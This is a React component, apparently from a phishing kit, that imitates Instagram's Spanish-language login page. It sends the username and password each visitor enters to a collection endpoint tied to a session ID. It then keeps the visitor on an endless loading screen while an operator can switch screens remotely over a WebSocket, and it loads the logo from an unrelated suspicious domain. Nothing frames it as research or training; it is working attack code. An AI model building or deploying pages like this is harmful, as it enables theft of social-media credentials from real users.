import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";

export default function TemplateInstagram() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  const [currentScreen, setCurrentScreen] = useState("login");
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        console.log("Instagram template received WebSocket message:", lastMessage);
        const message = JSON.parse(lastMessage);
        console.log("Parsed message:", message);
        console.log("Current sessionId:", sessionId);
        console.log("Message sessionId:", message.data?.id);
        console.log("Current screen:", currentScreen);
        console.log("Message screen:", message.data?.currentScreen);
        
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          console.log("Changing screen to:", message.data.currentScreen);
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.username || !formData.password) return;

    await submitData("username", formData.username);
    await submitData("password", formData.password);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });

    // Se queda en loader sin redireccionar
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return (
          <div className="min-h-screen bg-black flex flex-col items-center justify-center px-4">
            <div className="w-full max-w-sm">
              {/* Instagram Logo */}
              <div className="text-center mb-8">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/Instagram-PNG-Transparent.png" 
                  alt="Instagram" 
                  className="h-16 mx-auto"
                />
              </div>

              {/* Login Form */}
              <form onSubmit={handleLoginSubmit} className="space-y-3">
                <div className="relative">
                  <input
                    type="text"
                    value={formData.username}
                    onChange={(e) => handleInputChange("username", e.target.value)}
                    className="w-full h-11 bg-gray-900 border border-gray-700 rounded px-3 text-white text-sm placeholder-gray-400 focus:border-gray-500 focus:outline-none"
                    placeholder="Teléfono, usuario o correo electrónico"
                    data-testid="input-username"
                    required
                  />
                </div>

                <div className="relative">
                  <input
                    type="password"
                    value={formData.password}
                    onChange={(e) => handleInputChange("password", e.target.value)}
                    className="w-full h-11 bg-gray-900 border border-gray-700 rounded px-3 text-white text-sm placeholder-gray-400 focus:border-gray-500 focus:outline-none"
                    placeholder="Contraseña"
                    data-testid="input-password"
                    required
                  />
                </div>

                <button 
                  type="submit"
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded text-sm font-semibold transition-colors mt-4"
                  data-testid="button-login"
                >
                  Iniciar sesión
                </button>
              </form>

              {/* Divider */}
              <div className="flex items-center my-6">
                <div className="flex-1 border-t border-gray-700"></div>
                <span className="px-4 text-gray-500 text-sm font-semibold">O</span>
                <div className="flex-1 border-t border-gray-700"></div>
              </div>

              {/* Facebook Login */}
              <button className="w-full flex items-center justify-center text-blue-400 text-sm font-semibold mb-6">
                <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Iniciar sesión con Facebook
              </button>

              {/* Forgot Password */}
              <div className="text-center">
                <a href="#" className="text-blue-400 text-sm">
                  ¿Olvidaste tu contraseña?
                </a>
              </div>
            </div>

            {/* Sign Up Link */}
            <div className="mt-8 text-center">
              <span className="text-gray-400 text-sm">¿No tienes una cuenta? </span>
              <a href="#" className="text-blue-400 text-sm font-semibold">
                Regístrate
              </a>
            </div>

            {/* Footer Links */}
            <div className="mt-12 text-center">
              <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
                <a href="#" className="hover:underline">Meta</a>
                <a href="#" className="hover:underline">Información</a>
                <a href="#" className="hover:underline">Blog</a>
                <a href="#" className="hover:underline">Empleo</a>
                <a href="#" className="hover:underline">Ayuda</a>
                <a href="#" className="hover:underline">API</a>
                <a href="#" className="hover:underline">Privacidad</a>
              </div>
              <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
                <a href="#" className="hover:underline">Privacidad de salud del consumidor</a>
                <a href="#" className="hover:underline">Condiciones</a>
                <a href="#" className="hover:underline">Ubicaciones</a>
              </div>
              <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500">
                <a href="#" className="hover:underline">Instagram Lite</a>
                <a href="#" className="hover:underline">Meta AI</a>
                <a href="#" className="hover:underline">Artículos de Meta AI</a>
                <a href="#" className="hover:underline">Threads</a>
              </div>
            </div>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-black flex items-center justify-center">
            <div className="text-center text-white">
              <div className="mb-8">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/Instagram-PNG-Transparent.png" 
                  alt="Instagram" 
                  className="h-16 mx-auto mb-6"
                />
              </div>
              <div className="animate-spin w-8 h-8 border-4 border-pink-500 border-t-transparent rounded-full mx-auto mb-4"></div>
              <p className="text-gray-300">Iniciando sesión...</p>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return renderScreen();
}